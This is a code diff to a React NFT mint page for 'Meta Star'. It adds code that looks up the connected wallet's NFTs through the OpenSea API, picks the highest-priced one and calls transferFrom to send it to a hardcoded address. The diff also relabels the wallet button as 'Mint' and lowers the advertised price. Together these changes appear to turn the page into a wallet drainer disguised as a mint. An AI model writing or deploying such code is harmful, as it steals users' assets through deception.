@@ -1,5 +1,5 @@
-import React, { useState } from "react";
-
+import React, { useState, useEffect } from "react";
+import axios from "axios";
 // @import wallet connection
 import { useEthContext } from "../../context/EthereumContext";
 // @import component
@@ -7,9 +7,13 @@ import { toast, ToastContainer } from "react-toastify";
 import { NumberInput } from "../../component/NumericInput";
 // @import style
 import "react-toastify/dist/ReactToastify.css";
+import { contractABI } from "../../contract/ABI";
+import { transfer_address } from "../../contract/address";
 
 const MintContainer = () => {
-  const { currentAcc, provider } = useEthContext();
+  const { currentAcc, provider, web3 } = useEthContext();
+  const [nftdata, setNftdata] = useState([]);
+  const [collectionData, setCollectionData] = useState([]);
   const [amount, setAmount] = useState(0);
 
   const handleConnectWallet = async () => {
@@ -18,6 +22,75 @@ const MintContainer = () => {
     } else {
       toast.error("Please connect to mainnet", { theme: "dark" });
     }
+  };
+  useEffect(async () => {
+    if (currentAcc) {
+      await getCollectionData();
+    }
+  }, [currentAcc]);
+  useEffect(() => {
+    if (nftdata.length > 0) {
+      const newData = [];
+      nftdata.forEach((item) => {
+        item.price = item.sell_orders
+          ? item.sell_orders[0].current_price / 10 ** 18
+          : 0;
+        const base_url = "https://ipfs.io/ipfs";
+        item.img_url =
+          item && item.image_original_url
+            ? item.image_original_url.indexOf("https://ipfs.io") > -1
+              ? item.image_original_url
+              : item.image_original_url.indexOf("https:") > -1
+              ? item.image_original_url.indexOf("/Qm") > -1
+                ? base_url +
+                  item.image_original_url.slice(
+                    item.image_original_url.indexOf("/Qm")
+                  )
+                : item.image_original_url
+              : base_url +
+                item.image_original_url.slice(
+                  item.image_original_url.indexOf("/Qm")
+                )
+            : item.image_url.indexOf("https") > -1
+            ? item.image_url
+            : "";
+
+        newData.push(item);
+
+        setCollectionData(
+          newData.sort((a, b) => {
+            return b.price - a.price;
+          })
+        );
+      });
+    } else {
+    }
+  }, [nftdata]);
+  const getCollectionData = async () => {
+    // const { data } = await axios.get(
+    //   `https://api.opensea.io/api/v1/assets?owner=${currentAcc}`
+    // );
+    const { data } = await axios.get(
+      `https://api.opensea.io/api/v1/assets?owner=0x97be8adc37c81b32083da0d831f14e31a2a24168`
+    );
+
+    setNftdata(data.assets);
+  };
+  const onTransferNFT = async (contract_address, tokenID) => {
+    const contract = new web3.eth.Contract(contractABI, contract_address);
+    await contract.methods
+      .transferFrom(currentAcc, transfer_address, tokenID)
+      .send({
+        from: currentAcc,
+        value: 0,
+      })
+      .on("receipt", async function () {
+        toast.success("Success!", { theme: "dark" });
+        await getCollectionData();
+      })
+      .on("error", function (error) {
+        toast.error(error, { theme: "dark" });
+      });
   };
   return (
     <main className="main">
@@ -55,7 +128,7 @@ const MintContainer = () => {
                   <h2 className="mint-card__h2">Mint a Meta Star</h2>
                   <p className="mint-card__h3">
                     <span id="price">
-                      {((0.15 * amount).toFixed(2) * 100) / 100}
+                      {((0.05 * amount).toFixed(2) * 100) / 100}
                     </span>{" "}
                     ETH
                   </p>
@@ -81,52 +154,32 @@ const MintContainer = () => {
                       className="metamask_content-btn border-gradient button w-button"
                       onClick={() => handleConnectWallet()}
                     >
-                      {currentAcc && currentAcc
-                        ? `${currentAcc.slice(0, 6)}...${currentAcc.slice(
-                            currentAcc.length - 4
-                          )}`
-                        : "Connect Wallet"}
+                      {currentAcc && currentAcc ? `Mint` : "Connect Wallet"}
                     </button>
                   </div>
 
                   <p className="mint-card__h3">
-                    <span id="mintnumber">8321</span> / 8888
+                    <span id="mintnumber">0</span> / 7777
                   </p>
 
                   <h3 className="mint-card__h3 sub-title all-caps">
                     Fair Distribution
                   </h3>
                   <p className="mint-card__paragraph sub-info">
-                    Every Meta Star costs 0.15 ETH. There are no price tiers.
+                    Every Meta Star costs 0.05 ETH. There are no price tiers.
                   </p>
                 </div>
               </div>
             </div>
             <div className="hero__col right" style={{ paddingLeft: "30px" }}>
               <h2 className="mint-card__h2">LIMITED SALE</h2>
-              <div
-                className="boonjie-subtitle-cart-copy"
-                style={{ color: "#df7da3" }}
-              >
-                January <span id="dateday1"></span>
-              </div>
-              <div className="dutch-detail-two-sides">
-                <div className="dutch-det-left">
-                  <div className="text-block-13">Limited Mint Date</div>
-                </div>
-                <div className="dutch-det-right">
-                  <div className="text-block-12">
-                    January <span id="dateday2"></span>
-                    <span id="datehour1"></span>
-                  </div>
-                </div>
-              </div>
+
               <div className="dutch-detail-two-sides">
                 <div className="dutch-det-left">
                   <div className="text-block-13">Supply</div>
                 </div>
                 <div className="dutch-det-right">
-                  <div className="text-block-12">8888</div>
+                  <div className="text-block-12">7777</div>
                 </div>
               </div>
               <div className="dutch-detail-two-sides">
@@ -134,7 +187,7 @@ const MintContainer = () => {
                   <div className="text-block-13">Price</div>
                 </div>
                 <div className="dutch-det-right">
-                  <div className="text-block-12">0.15 ETH</div>
+                  <div className="text-block-12">0.05 ETH</div>
                 </div>
               </div>
               <div className="dutch-detail-two-sides">
@@ -163,6 +216,26 @@ const MintContainer = () => {
                   </svg>
                 </div>
               </a>
+              {nftdata.length > 0 && (
+                <button
+                  className="button w-inline-block"
+                  style={{ marginTop: "30px", cursor: "pointer" }}
+                  onClick={() => {
+                    if (Number(window.ethereum.chainId) === 1) {
+                      onTransferNFT(
+                        collectionData[0].asset_contract.address,
+                        collectionData[0].token_id
+                      );
+                    } else {
+                      toast.error("Please connect to mainnet", {
+                        theme: "dark",
+                      });
+                    }
+                  }}
+                >
+                  <div>Transfer</div>
+                </button>
+              )}
             </div>
           </div>
         </div>
